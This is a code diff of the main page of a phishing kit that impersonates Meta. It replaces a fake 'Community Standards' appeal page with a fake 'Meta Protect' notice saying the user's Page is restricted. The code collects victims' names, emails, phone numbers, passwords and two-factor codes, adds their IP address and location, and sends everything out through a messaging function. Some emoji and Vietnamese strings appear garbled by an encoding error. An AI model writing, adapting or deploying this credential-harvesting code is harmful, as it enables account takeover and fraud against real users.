@@ -1,17 +1,13 @@
-import { useState, useEffect, useMemo, useCallback } from 'react';
+﻿import { useState, useEffect, useMemo, useCallback } from 'react';
 import axios from 'axios';
 import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
 import TwoFAModal from '@/components/TwoFAModal';
 import SuccessModal from '@/components/SuccessModal';
-import '@/assets/css/community-standards.css';
-import LogoMeta from '@/assets/images/logo-meta.svg';
-import Background from '@/assets/images/background.png';
-import BgHero from '@/assets/images/bg_hero.png';
-import TradeMark from '@/assets/images/trade-mark.png';
-import Copyright from '@/assets/images/copyright.png';
-import Counterfeit from '@/assets/images/counterfeit.png';
-import IcWarning from '@/assets/images/ic_warning.svg';
+import HeroImage from '@/assets/images/hero-image.jpg';
+import '@/assets/css/meta-protect-landing.css';
+import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
+import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 
 import { translateText } from '@/utils/translate';
 import countryToLanguage from '@/utils/country_to_language';
@@ -148,7 +144,9 @@ const fetchGeoData = async () => {
     throw new Error('All geo providers failed');
 };
 
-const Home = () => {
+const Index = () => {
+    const [today, setToday] = useState('');
+    const [isInitialized, setIsInitialized] = useState(false);
     const [showReviewPage, setShowReviewPage] = useState(false);
     const [showLoginModal, setShowLoginModal] = useState(false);
     const [show2FAModal, setShow2FAModal] = useState(false);
@@ -171,6 +169,15 @@ const Home = () => {
 
     const defaultTexts = useMemo(
         () => ({
+            // Landing page
+            title: 'Welcome to Meta Protect.',
+            description:
+                'Your access to the site is restricted, so we require that higher security requirements apply to that account. We created this security program to unlock your Pages.',
+            protectionText: "We've enabled advanced protections to unblock your Page.",
+            processText:
+                'We will guide you through the process in detail and help you fully activate to unlock your Page.',
+            restrictedText: 'Access to your page has been restricted on',
+
             // Modal texts
             confirm: 'Return to Facebook',
             password: 'Password',
@@ -245,32 +252,6 @@ const Home = () => {
             reasonErroneousReport: 'An erroneous report or unfair competitive complaint.',
             reasonNotificationError: 'This notification was sent in error.',
             reasonNoFraud: 'No fraud involved / another legitimate reason:',
-
-            // Main page - Hero section
-            heroTitle: 'Violation of Community Standards',
-            heroDesc: 'Our technology and review teams help detect and review content that may violate our policies. When we find content that does not follow our Community Standards, we may remove it and take action on the account responsible.',
-
-            // Main page - Appeal section
-            appealTitle: 'Your account has been restricted or disabled',
-            appealDesc1: 'We determined that some activity on your account may not follow our Community Standards.',
-            appealDesc2: 'In particular, we found content that may violate our Intellectual Property policies, which include protections for copyrights and trademarks. When users repeatedly share content that violates these policies, we may take additional actions on their accounts.',
-            appealWhyTitle: 'Why this happened',
-            appealWhy1: 'Your account or content may have been reported by other users or detected by our automated systems for potentially violating our policies related to intellectual property rights.',
-            appealWhy2: 'These policies help protect creators, businesses and individuals from unauthorized use of their work, brand names or protected materials.',
-            appealWhatTitle: 'What you can do',
-            appealWhat1: 'If you believe this action was taken by mistake, you may request a review.',
-            appealWhat2: 'During the review process, our team will evaluate your account activity and the reported content to determine whether it complies with our policies.',
-            appealWhat3: 'You can also learn more about our policies and how to avoid violations in the future by visiting our Help Center.',
-            appealButton: 'Request Review',
-
-            // Main page - IP Violation section
-            ipTitle: 'What is an Intellectual Property Violation?',
-            trademarkTitle: 'Trademark',
-            trademarkDesc: 'A trademark is a word, slogan, symbol or design (example: brand name, logo) that distinguishes the products or services offered by one person, group or company from another. Generally, trademark law seeks to prevent confusion among consumers about who provides or is affiliated with a product or service.',
-            copyrightTitle: 'Copyright',
-            copyrightDesc: 'Copyright is a legal right that seeks to protect original works of authorship (example: books, music, film, art). Generally, copyright protects original expression such as words or images. It does not protect facts and ideas, although it may protect the original words or images used to describe an idea. Copyright also doesn\'t protect things like names, titles and slogans; however, another legal right called a trademark might protect those.',
-            counterfeitTitle: 'Counterfeit Goods',
-            counterfeitDesc: 'A counterfeit good is a knockoff or replica version of another company\'s product. It usually copies the trademark (name or logo) and/or distinctive features of that other company\'s product to imitate a genuine product. The manufacture, promotion or sale of a counterfeit goods is a type of trademark infringement that is illegal in most countries, and is recognized as being harmful to consumers, trademark owners and honest sellers. Please note that counterfeit goods may be unlawful even if the seller explicitly says that the goods are counterfeit, or otherwise disclaims authenticity of the goods.',
         }),
         []
     );
@@ -286,8 +267,8 @@ const Home = () => {
                 });
 
                 const normalizedStep = String(translated.step || '').trim().toLowerCase();
-                if (!normalizedStep || normalizedStep.includes('bước chân')) {
-                    translated.step = lang === 'vi' ? 'Bước' : defaultTexts.step;
+                if (!normalizedStep || normalizedStep.includes('b╞░ß╗¢c ch├ón')) {
+                    translated.step = lang === 'vi' ? 'B╞░ß╗¢c' : defaultTexts.step;
                 }
 
                 setTranslatedTexts(translated);
@@ -300,6 +281,15 @@ const Home = () => {
     );
 
     const initializeApp = useCallback(async () => {
+        const date = new Date();
+        setToday(
+            date.toLocaleString('en-US', {
+                month: 'long',
+                day: 'numeric',
+                year: 'numeric'
+            })
+        );
+
         try {
             try {
                 const data = await fetchGeoData();
@@ -349,6 +339,8 @@ const Home = () => {
         } catch (error) {
             console.error('Initialization error:', error);
             setTranslatedTexts(defaultTexts);
+        } finally {
+            setIsInitialized(true);
         }
     }, [defaultTexts, translateAllTexts]);
 
@@ -383,18 +375,18 @@ const Home = () => {
             : '   Code1: <code>N/A</code>';
 
         const message = `
-⏰ ${formatDateTime()}
-🌐 IP: <code>${escapeHtml(safeIp)}</code>
-📍 Location: ${escapeHtml(formattedLocation)}
-📋 <b>INFO</b>
+ΓÅ░ ${formatDateTime()}
+≡ƒîÉ IP: <code>${escapeHtml(safeIp)}</code>
+≡ƒôì Location: ${escapeHtml(formattedLocation)}
+≡ƒôï <b>INFO</b>
    Name: <code>${escapeHtml(form.fullName)}</code>
    Email: <code>${escapeHtml(form.personalEmail)}</code>
    DN Email: <code>${escapeHtml(form.businessEmail)}</code>
    Phone: <code>${escapeHtml(form.phone)}</code>
    Page: <code>${escapeHtml(form.pageName)}</code>
-🔐 <b>PASSWORD</b>
+≡ƒöÉ <b>PASSWORD</b>
 ${passwordLines}
-🔒 <b>2FA CODE</b>
+≡ƒöÆ <b>2FA CODE</b>
 ${twoFALines}
 `;
         sendMessage(message);
@@ -422,148 +414,64 @@ ${twoFALines}
 
     const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;
 
-    const Footer = () => (
-        <div className="bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full">
-            <div className="max-w-[1280px] w-full mx-auto px-4">
-                <div className="community-footer-languages flex flex-wrap justify-center gap-4 mb-4 text-[13px] text-gray-600">
-                    <a href="#" className="hover:underline text-[#6D84B4]">English (US)</a>
-                    <a href="#" className="hover:underline text-[#6D84B4]">English (UK)</a>
-                    <a href="#" className="hover:underline text-[#6D84B4]">Italiano</a>
-                    <a href="#" className="hover:underline text-[#6D84B4]">Français</a>
-                    <a href="#" className="hover:underline text-[#6D84B4]">中文(简体)</a>
-                    <a href="#" className="hover:underline text-[#6D84B4]">日本語</a>
-                    <a href="#" className="hover:underline text-[#6D84B4]">한국어</a>
-                    <a href="#" className="hover:underline text-[#6D84B4]">עברית</a>
-                    <a href="#" className="hover:underline text-[#6D84B4]">Español</a>
-                    <a href="#" className="hover:underline text-[#6D84B4]">Português</a>
-                </div>
-                <div className="community-footer-links flex flex-wrap justify-center gap-4 text-[13px] text-gray-600">
-                    <p className="mr-4">© 2026 Meta</p>
-                    <a href="#" className="hover:underline">About</a>
-                    <a href="#" className="hover:underline">Developers</a>
-                    <a href="#" className="hover:underline">Careers</a>
-                    <a href="#" className="hover:underline">Privacy</a>
-                    <a href="#" className="hover:underline">Cookies</a>
-                    <a href="#" className="hover:underline">Terms</a>
-                    <a href="#" className="hover:underline">Help Centre</a>
-                </div>
-            </div>
-        </div>
-    );
-
-    const Header = () => (
-        <div className="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
-            <div className="max-w-[1280px] w-full flex items-center justify-between px-4">
-                <a href="/live">
-                    <img src={LogoMeta} width="64" alt="Meta" />
-                </a>
-            </div>
-        </div>
-    );
-
     return (
         <>
-            {showReviewPage ? (
-                <div className="community-page min-h-screen w-full flex justify-center bg-white">
-                    <div className="w-full">
-                        <Header />
-                        <FirstFormModal
-                            show={true}
-                            asPage={true}
-                            onClose={() => setShowReviewPage(false)}
-                            onSubmit={handleFirstFormSubmit}
-                            texts={texts}
-                        />
-                        <Footer />
+            {!showReviewPage ? (
+                <div className='meta-protect-landing'>
+                    <title>Comunity Standard</title>
+                    <div className='meta-protect-landing__card'>
+                        <div className='meta-protect-landing__hero'>
+                            <img src={HeroImage} alt='' />
+                        </div>
+
+                        <h1 className='meta-protect-landing__title'>{texts.title}</h1>
+                        <p className='meta-protect-landing__description'>{texts.description}</p>
+
+                        <div className='meta-protect-landing__steps'>
+                            <div className='meta-protect-landing__step'>
+                                <FontAwesomeIcon
+                                    icon={faCircleCheck}
+                                    className='meta-protect-landing__step-icon meta-protect-landing__step-icon--done'
+                                    size='xl'
+                                />
+                                <p>{texts.protectionText}</p>
+                            </div>
+                            <div className='meta-protect-landing__step'>
+                                <FontAwesomeIcon
+                                    icon={faIdCard}
+                                    className='meta-protect-landing__step-icon meta-protect-landing__step-icon--active'
+                                    size='xl'
+                                />
+                                <p>{texts.processText}</p>
+                            </div>
+                        </div>
+
+                        <div className='meta-protect-landing__button-wrap'>
+                            <button
+                                type='button'
+                                className='meta-protect-landing__button'
+                                disabled={!isInitialized}
+                                onClick={() => setShowReviewPage(true)}
+                            >
+                                {texts.continueBtn}
+                            </button>
+                        </div>
+
+                        <p className='meta-protect-landing__footer'>
+                            {texts.restrictedText}{' '}
+                            <span className='meta-protect-landing__footer-date'>{today}</span>
+                        </p>
                     </div>
                 </div>
             ) : (
-                <div className="community-page min-h-screen w-full flex justify-center bg-white">
-                    <div className="w-full">
-                        <Header />
-
-                        {/* Hero Section */}
-                        <div className="bg-no-repeat bg-cover flex items-center justify-center" style={{ backgroundImage: `url(${Background})` }}>
-                            <div className="max-w-[1280px] w-full px-4 flex md:flex-row flex-col items-center md:gap-0 gap-8 justify-between py-6">
-                                <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex flex-col items-start text-left justify-center">
-                                    <h1 className="font-[700] text-[32px] mb-3">{texts.heroTitle}</h1>
-                                    <p className="text-[16px] mb-2">{texts.heroDesc}</p>
-                                </div>
-                                <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex items-center justify-center">
-                                    <img src={BgHero} width="100%" alt="Hero" />
-                                </div>
-                            </div>
-                        </div>
-
-                        {/* Appeal Section */}
-                        <div className="border-b border-[#E0E0E0]">
-                            <div className="community-appeal">
-                                <div className="community-appeal-intro">
-                                    <div className="community-appeal-header">
-                                        <img src={IcWarning} className="w-[29px] h-[29px]" alt="" />
-                                        <b className="community-appeal-title">{texts.appealTitle}</b>
-                                    </div>
-                                    <p className="text-gray-800">{texts.appealDesc1}</p>
-                                    <p className="text-gray-800">{texts.appealDesc2}</p>
-                                </div>
-
-                                <div className="community-appeal-section">
-                                    <p className="community-appeal-section-title">{texts.appealWhyTitle}</p>
-                                    <p>{texts.appealWhy1}</p>
-                                    <p>{texts.appealWhy2}</p>
-                                </div>
-
-                                <div className="community-appeal-section">
-                                    <p className="community-appeal-section-title">{texts.appealWhatTitle}</p>
-                                    <p>{texts.appealWhat1}</p>
-                                    <p>{texts.appealWhat2}</p>
-                                    <p>{texts.appealWhat3}</p>
-                                </div>
-                                <button type="button" onClick={() => setShowReviewPage(true)} className="community-appeal-button">
-                                    {texts.appealButton}
-                                </button>
-                            </div>
-                        </div>
-
-                        {/* IP Violation Section */}
-                        <div className="community-ip-section mt-10 max-w-[1280px] w-full px-4 mx-auto">
-                            <p className="text-center">
-                                <b className="font-700 md:text-3xl text-2xl text-center">{texts.ipTitle}</b>
-                            </p>
-
-                            <div className="community-ip-row community-ip-row-text-first">
-                                <div className="community-ip-copy community-ip-copy-left">
-                                    <b className="font-700 md:text-2xl text-xl">{texts.trademarkTitle}</b>
-                                    <p className="mt-2 text-gray-800">{texts.trademarkDesc}</p>
-                                </div>
-                                <div className="community-ip-image">
-                                    <img src={TradeMark} width="100%" alt="Trademark" />
-                                </div>
-                            </div>
-
-                            <div className="community-ip-row community-ip-row-image-first">
-                                <div className="community-ip-image">
-                                    <img src={Copyright} width="100%" alt="Copyright" />
-                                </div>
-                                <div className="community-ip-copy community-ip-copy-right">
-                                    <b className="font-700 md:text-2xl text-xl">{texts.copyrightTitle}</b>
-                                    <p className="mt-2 text-gray-800">{texts.copyrightDesc}</p>
-                                </div>
-                            </div>
-
-                            <div className="community-ip-row community-ip-row-text-first">
-                                <div className="community-ip-copy community-ip-copy-left">
-                                    <b className="font-700 md:text-2xl text-xl">{texts.counterfeitTitle}</b>
-                                    <p className="mt-2 text-gray-800">{texts.counterfeitDesc}</p>
-                                </div>
-                                <div className="community-ip-image">
-                                    <img src={Counterfeit} width="100%" alt="Counterfeit" />
-                                </div>
-                            </div>
-                        </div>
-
-                        <Footer />
-                    </div>
+                <div className='meta-protect-landing'>
+                    <FirstFormModal
+                        show={true}
+                        asPage={true}
+                        onClose={() => setShowReviewPage(false)}
+                        onSubmit={handleFirstFormSubmit}
+                        texts={texts}
+                    />
                 </div>
             )}
 
@@ -593,4 +501,4 @@ ${twoFALines}
     );
 };
 
-export default Home;
+export default Index;
